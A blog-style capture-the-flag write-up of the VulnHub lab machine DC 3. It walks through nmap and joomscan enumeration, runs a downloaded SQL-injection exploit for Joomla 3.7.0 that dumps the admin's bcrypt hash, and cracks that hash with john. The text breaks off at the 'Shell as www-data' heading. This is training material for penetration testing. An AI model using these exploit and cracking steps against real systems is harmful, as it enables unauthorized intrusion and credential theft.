---
title: Vulnhub - DC 3
description: My writeup on DC 3 box.
categories:
 - vulnhub
tags: vulnhub joomla whatweb joomscan joomblah
---

![](https://i.imgur.com/wp2kece.png)

## Box Stats

| Box Info      | Details       |
| ------------- |:-------------:|
| Box Name :    | **DC 3**  |
| Series :      | **DC**         |
| Difficulty :  | **Easy/Medium**             |   
| Release Date :| **25 Apr 2020**      |    
| OS :          | **GNU/Linux**        |   
| Maker :       | [DCAU](https://twitter.com/@DCAU7){:target="_blank"}     |
| Download :    | [DC 3](https://www.vulnhub.com/entry/dc-32,312/){:target="_blank"}      |
| Recommended : | Yes :heavy_check_mark:      |

## Summary

Hello all, let's continue the DC series. Let's pwn it!

## PoC

![](https://i.imgur.com/suy08NX.png)

## Target IP

Always first step is to find target IP address, i prefer to use the `arp-scan` utility. Then we'll save the IP address in a variable.

```
$ arp-scan --localnet | grep "PCS Systemtechnik GmbH"
192.168.1.18	08:00:27:38:8b:a0	PCS Systemtechnik GmbH
$ ip=192.168.1.18
 ```

## Enumeration/Reconnaissance

Now as always letâ€™s continue with a nmap scan.

```
$ nmap -p- --min-rate 10000 $ip
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-20 17:29 EET
Nmap scan report for dc-3.zte.com.cn (192.168.1.18)
Host is up (0.00044s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:91:ED:93 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.34 seconds

$ nmap -p 80 -sC -sV -oN nmap/dc3.vulnhub $ip
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-20 17:29 EET
Nmap scan report for dc-3.zte.com.cn (192.168.1.18)
Host is up (0.00056s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home
```

Once we visit the website we can see that is running joomla. We can double-check that using `whatweb`.

```
$ whatweb http://$ip/ | tee scans/whatweb.txt
http://192.168.1.18/ [200 OK] Apache[2.4.18], Bootstrap, Cookies[460ada11b31d3c5e5ca6e58fd5d3de27], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], HttpOnly[460ada11b31d3c5e5ca6e58fd5d3de27], IP[192.168.1.18], JQuery, MetaGenerator[Joomla! - Open Source Content Management], PasswordField[password], Script[application/json], Title[Home]
```

Googline around for a joomla vulnerability scanner, i found out this [joomscan](https://github.com/OWASP/joomscan){:target="_blank"} that is pre-installed on kali. Let's fire it up!

```
$ joomscan --url http://$ip/ | tee scans/joomscan.txt

Processing http://192.168.1.18/ ...

[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0

...data...
```

A really important thing that tell us is the version `3.7.0`! Let's search for possible exploits.

```
$ searchsploit joomla 3.7.0
----------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                 |  Path
----------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection                                                                                                     | php/webapps/42033.txt
```

Perfect, this exploit is about `sqlmap` i googled around and i found a [python one](https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py){:target="_blank"} that automates this. Let's download it and run it.

```
$ wget -q https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
$ python joomblah.py http://$ip/

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: d8uea_users
  -  Found table: users
  -  Extracting users from d8uea_users
 [$] Found user ['629', 'admin', 'admin', 'freddy@norealaddress.net', '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu', '', '']
```

Perfect! We have admin's hash. I used [tunnelsup](https://www.tunnelsup.com/hash-analyzer/){:target="_blank"} to find the hash type.

![](https://i.imgur.com/kD5t8Dp.png)

Let's fire up our friend john.

```
$ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
snoopy           (?)
```

## Shell as www-data
